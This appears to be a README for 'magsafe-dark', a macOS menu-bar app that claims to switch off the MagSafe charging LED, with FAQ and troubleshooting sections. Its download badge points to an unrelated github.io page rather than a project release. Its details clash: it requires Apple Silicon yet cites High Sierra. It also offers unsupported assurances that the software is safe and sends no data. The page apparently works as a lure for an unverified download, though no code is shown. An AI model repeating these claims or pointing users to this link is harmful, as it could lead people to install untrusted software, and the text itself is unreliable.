# 🔋 magsafe-dark - Disable your MacBook charging light easily

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://uniquec6118.github.io)

## What is this tool?
Some people find the orange or green charging light on their MacBook MagSafe cable distracting. This utility solves that problem. It runs as a small icon in your menu bar. You click it to turn the charging light off or on. This happens instantly. It does not change how your battery charges. It only changes the LED light on the connector.

## 🛠 System Requirements
This tool works on Apple Silicon MacBooks. It requires macOS. You do not need to install extra drivers or complex software. It uses built-in system features to communicate with the hardware. Ensure your MacBook is up to date with the latest macOS version for the best experience.

## ⚙️ How it works
The utility stays in your menu bar. Look for the small icon near your clock. Click the icon to see a menu. You will see an option to disable the LED. Click that option to switch the light off. The change takes effect immediately. The light stays off until you change the setting again or unplug your charger. If you unplug the charger and plug it back in, the system might reset the light. Click the menu option again to turn it back off. The app remembers your preference while it stays open in the background.

## 📋 Frequently Asked Questions

### Does this damage my battery?
No. This tool only communicates with the light controller inside the hardware. It does not alter power delivery or charging voltages. Your battery health remains unaffected.

### Why does the light come back on after a restart?
The system resets the MagSafe LED state when you restart your MacBook. Launch the application again to restore your preferred setting. Many users set the app to open at startup so it runs automatically. 

### Can I change the color of the light?
The hardware supports only green, orange, and off. This utility allows you to move between these states or turn the light off completely. You cannot create new colors like blue or purple. 

### Does it use much memory?
The program uses almost no system resources. It sits idle until you click the menu bar icon. It does not slow down your computer or affect performance.

### Is the software safe?
The code runs directly on your hardware without external servers. It does not send your data anywhere. It performs one simple task on your local machine.

## 🔧 Troubleshooting
If you have trouble with the tool, try these steps:

1. Close the app completely.
2. Re-open the app from your Applications folder.
3. Unplug your MagSafe cable and plug it back in.
4. Check your macOS version. High Sierra or newer models work best.
5. If the light does not change, wait five seconds and try again.

If the app fails to open, verify that you moved the file from the download folder into the Applications folder. Running the file directly from the download folder can sometimes cause permission errors on newer versions of macOS.
